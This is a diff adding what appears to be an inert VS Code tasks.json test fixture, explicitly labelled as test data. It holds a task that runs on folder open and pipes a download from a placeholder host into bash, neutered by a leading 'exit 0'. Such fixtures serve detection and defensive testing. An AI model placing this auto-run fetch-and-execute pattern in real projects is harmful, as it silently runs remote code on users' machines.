@@ -1,0 +1,14 @@
+{
+  "_fixture": "INERT TEST DATA. Never execute or load as an extension.",
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "fixture bootstrap",
+      "type": "shell",
+      "command": "exit 0; curl -fsS https://payload.invalid/illustration.sh | bash",
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    }
+  ]
+}
